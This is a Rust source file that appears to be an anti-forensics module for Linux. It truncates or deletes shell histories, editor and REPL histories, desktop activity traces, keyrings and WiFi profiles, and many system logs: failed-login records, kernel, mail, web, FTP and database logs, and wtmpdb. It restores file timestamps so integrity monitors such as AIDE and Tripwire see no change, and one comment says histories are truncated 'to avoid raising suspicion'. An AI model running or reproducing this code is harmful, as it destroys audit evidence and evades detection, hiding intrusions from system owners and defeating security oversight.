// Clean process-trace artifacts: recently-used files, session errors, thumbnails,
// GTK bookmarks, X11 sockets, pip user cache, web/ftp/db logs, and misc desktop traces.

use std::fs;
use std::path::{Path, PathBuf};

#[derive(Default)]
pub struct ProcCleanStats {
    pub files_removed: u32,
    pub dirs_removed:  u32,
    pub errors:        u32,
}

// Save (atime_sec, mtime_sec) from metadata before we touch the file.
fn save_times(p: &Path) -> Option<(i64, i64)> {
    use std::os::unix::fs::MetadataExt;
    fs::metadata(p).ok().map(|m| (m.atime(), m.mtime()))
}

// Restore atime+mtime via utimensat so FIM tools (AIDE, Tripwire, auditd -w) see no change.
// ctime will still be updated by the kernel — unavoidable without kernel patches.
fn restore_times(p: &Path, atime: i64, mtime: i64) {
    use std::ffi::CString;
    let times = [
        libc::timespec { tv_sec: atime, tv_nsec: 0 },
        libc::timespec { tv_sec: mtime, tv_nsec: 0 },
    ];
    if let Ok(c) = CString::new(p.as_os_str().as_encoded_bytes()) {
        unsafe {
            libc::utimensat(libc::AT_FDCWD, c.as_ptr(), times.as_ptr(), libc::AT_SYMLINK_NOFOLLOW);
        }
    }
}

fn remove_file_silent(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
    match fs::remove_file(p) {
        Ok(_)  => { s.files_removed += 1;
                    if verbose { eprintln!("[+] proc-clean: removed {:?}", p); } }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => { s.errors += 1;
                    if verbose { eprintln!("[!] proc-clean: {:?}: {}", p, e); } }
    }
}

fn truncate_file(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
    let ts = save_times(p); // snapshot before modification
    match fs::OpenOptions::new().write(true).open(p) {
        Ok(f)  => {
            let _ = f.set_len(0);
            s.files_removed += 1;
            // Restore timestamps so FIM detects no mtime change
            if let Some((a, m)) = ts { restore_times(p, a, m); }
            if verbose { eprintln!("[+] proc-clean: truncated {:?}", p); }
        }
        Err(_) => {}
    }
}

fn remove_dir_rec(p: &Path, s: &mut ProcCleanStats, verbose: bool) {
    match fs::remove_dir_all(p) {
        Ok(_)  => { s.dirs_removed += 1;
                    if verbose { eprintln!("[+] proc-clean: removed dir {:?}", p); } }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => { s.errors += 1;
                    if verbose { eprintln!("[!] proc-clean: {:?}: {}", p, e); } }
    }
}

// Truncate all files matching a glob pattern (handles rotated logs like auth.log.1, auth.log.2.gz)
#[cfg(target_os = "linux")]
fn wipe_glob(pattern: &str, s: &mut ProcCleanStats, verbose: bool) {
    if let Ok(paths) = glob::glob(pattern) {
        for entry in paths.flatten() {
            truncate_file(&entry, s, verbose);
        }
    }
}
#[cfg(not(target_os = "linux"))]
fn wipe_glob(_pattern: &str, _s: &mut ProcCleanStats, _verbose: bool) {}

fn home_dirs() -> Vec<PathBuf> {
    let mut homes = Vec::new();
    if let Ok(content) = fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 6 {
                let home = parts[5];
                let p = PathBuf::from(home);
                if p.exists() && p != PathBuf::from("/") { homes.push(p); }
            }
        }
    }
    if homes.is_empty() {
        if let Ok(h) = std::env::var("HOME") { homes.push(PathBuf::from(h)); }
    }
    homes
}

pub fn clean_proc_artifacts(verbose: bool) -> ProcCleanStats {
    let mut s = ProcCleanStats::default();

    // ── Per-user artifacts ────────────────────────────────────────────────────
    for home in home_dirs() {
        let targets = [
            // GNOME/GTK recent files
            home.join(".local/share/recently-used.xbel"),
            home.join(".local/share/recently-used.xbel.bak"),
            home.join(".recently-used"),
            // Session / display errors
            home.join(".xsession-errors"),
            home.join(".xsession-errors.old"),
            // GTK bookmarks (sidebar history)
            home.join(".config/gtk-3.0/bookmarks"),
            home.join(".config/gtk-4.0/bookmarks"),
            // PulseAudio stream history
            home.join(".config/pulse/stream-volumes.tdb"),
            // Nautilus/Files recent
            home.join(".local/share/gnome-shell/application_state"),
            // Bash sessions
            home.join(".bash_sessions/last_session"),
            // Vim/Neovim history
            home.join(".viminfo"),
            home.join(".local/share/nvim/shada/main.shada"),
            // less/man history
            home.join(".lesshst"),
        ];
        for t in &targets { remove_file_silent(t, &mut s, verbose); }

        // Thumbnail caches
        for tc in &[
            home.join(".thumbnails"),
            home.join(".cache/thumbnails"),
            home.join(".cache/mozilla/firefox/Crash Reports"),
        ] {
            remove_dir_rec(tc, &mut s, verbose);
        }

        // pip user cache
        let pip_log = home.join(".local/share/pip/pip.log");
        truncate_file(&pip_log, &mut s, verbose);

        // Bash history (truncate, not delete, to avoid raising suspicion)
        truncate_file(&home.join(".bash_history"), &mut s, verbose);
        truncate_file(&home.join(".zsh_history"), &mut s, verbose);
        truncate_file(&home.join(".fish_history"), &mut s, verbose);

        // Python / Node.js REPL history
        remove_file_silent(&home.join(".python_history"), &mut s, verbose);
        remove_file_silent(&home.join(".node_repl_history"), &mut s, verbose);

        // Clear dconf database (GNOME settings / recent activity)
        let dconf = home.join(".config/dconf/user");
        truncate_file(&dconf, &mut s, verbose);

        // GNOME Tracker search index (indexes all accessed files + timestamps)
        for tracker_dir in &[
            home.join(".local/share/tracker"),
            home.join(".local/share/tracker3"),
        ] {
            remove_dir_rec(tracker_dir, &mut s, verbose);
        }

        // GNOME Virtual FS metadata (stores access metadata per-path)
        remove_dir_rec(&home.join(".local/share/gvfs-metadata"), &mut s, verbose);

        // NetworkManager per-user connection profiles (WiFi credentials + history)
        // /etc/NetworkManager/system-connections/ is system-wide — handled below
        let nm_user = home.join(".local/share/keyrings");
        remove_dir_rec(&nm_user, &mut s, verbose);
    }

    // ── System-wide artifacts ─────────────────────────────────────────────────

    // X11 lock / socket files in /tmp
    if let Ok(rd) = fs::read_dir("/tmp") {
        for entry in rd.flatten() {
            let name = entry.file_name();
            let ns   = name.to_string_lossy();
            if ns.starts_with(".X") || ns.starts_with(".ICE") || ns.starts_with(".esd") {
                let p = entry.path();
                if p.is_file()   { remove_file_silent(&p, &mut s, verbose); }
                else if p.is_dir() { remove_dir_rec(&p, &mut s, verbose); }
            }
        }
    }

    // Shared memory segments exposed via /dev/shm
    if let Ok(rd) = fs::read_dir("/dev/shm") {
        for entry in rd.flatten() {
            remove_file_silent(&entry.path(), &mut s, verbose);
        }
    }

    // btmp: failed-login records (read by `lastb`) — same binary format as wtmp
    truncate_file(Path::new("/var/log/btmp"), &mut s, verbose);
    wipe_glob("/var/log/btmp.*", &mut s, verbose);

    // faillog: PAM per-UID failure counters (indexed binary, read by `faillog`)
    truncate_file(Path::new("/var/log/faillog"), &mut s, verbose);

    // kern.log: USB events, module loads, network kernel events
    truncate_file(Path::new("/var/log/kern.log"), &mut s, verbose);
    truncate_file(Path::new("/var/log/kern"), &mut s, verbose);
    wipe_glob("/var/log/kern.log.*", &mut s, verbose);

    // daemon.log: background service events
    truncate_file(Path::new("/var/log/daemon.log"), &mut s, verbose);
    wipe_glob("/var/log/daemon.log.*", &mut s, verbose);

    // dmesg snapshot (differs from /proc/kmsg ring buffer — this is the saved file)
    truncate_file(Path::new("/var/log/dmesg"), &mut s, verbose);
    truncate_file(Path::new("/var/log/dmesg.old"), &mut s, verbose);

    // maillog / mail server logs + mail spool
    for p in &["/var/log/mail.log", "/var/log/maillog", "/var/log/mail.err"] {
        truncate_file(Path::new(p), &mut s, verbose);
    }
    wipe_glob("/var/log/mail.log.*", &mut s, verbose);
    wipe_glob("/var/log/maillog.*", &mut s, verbose);
    truncate_file(Path::new("/var/spool/mail/root"), &mut s, verbose);
    // Plesk mail log
    truncate_file(Path::new("/usr/local/psa/var/log/maillog"), &mut s, verbose);

    // Web server logs — Apache2 (Debian/Ubuntu layout)
    wipe_glob("/var/log/apache2/access.log*", &mut s, verbose);
    wipe_glob("/var/log/apache2/error.log*", &mut s, verbose);
    wipe_glob("/var/log/apache2/other_vhosts_access.log*", &mut s, verbose);
    // Apache httpd (RHEL/CentOS layout)
    wipe_glob("/var/log/httpd/access_log*", &mut s, verbose);
    wipe_glob("/var/log/httpd/error_log*", &mut s, verbose);
    // Apache (generic layout)
    wipe_glob("/var/log/apache/access.log*", &mut s, verbose);
    wipe_glob("/var/log/apache/error.log*", &mut s, verbose);
    // Nginx
    wipe_glob("/var/log/nginx/access.log*", &mut s, verbose);
    wipe_glob("/var/log/nginx/error.log*", &mut s, verbose);

    // FTP server logs
    wipe_glob("/var/log/xferlog*", &mut s, verbose);
    wipe_glob("/var/log/pureftp.log*", &mut s, verbose);
    truncate_file(Path::new("/var/log/vsftpd.log"), &mut s, verbose);
    truncate_file(Path::new("/usr/local/psa/var/log/xferlog"), &mut s, verbose);

    // Database logs — MySQL / MariaDB
    truncate_file(Path::new("/var/log/mysql.log"), &mut s, verbose);
    truncate_file(Path::new("/var/log/mysqld.log"), &mut s, verbose);
    truncate_file(Path::new("/var/log/mysql/mysql.log"), &mut s, verbose);
    truncate_file(Path::new("/var/log/mysql/error.log"), &mut s, verbose);
    truncate_file(Path::new("/var/log/mariadb/mariadb.log"), &mut s, verbose);

    // NetworkManager connection profiles (WiFi credentials, connection history)
    let nm_conn = Path::new("/etc/NetworkManager/system-connections");
    if nm_conn.is_dir() {
        if let Ok(rd) = fs::read_dir(nm_conn) {
            for entry in rd.flatten() {
                let p = entry.path();
                if p.is_file() { remove_file_silent(&p, &mut s, verbose); }
            }
        }
    }

    // wtmpdb — Debian 13+ SQLite replacement for binary wtmp
    truncate_file(Path::new("/var/lib/wtmpdb/wtmpdb.db"), &mut s, verbose);
    truncate_file(Path::new("/var/lib/wtmpdb/wtmpdb.db-wal"), &mut s, verbose);
    truncate_file(Path::new("/var/lib/wtmpdb/wtmpdb.db-shm"), &mut s, verbose);

    if verbose {
        eprintln!("[+] proc-clean: {} files removed/truncated, {} dirs removed, {} errors",
            s.files_removed, s.dirs_removed, s.errors);
    }
    s
}
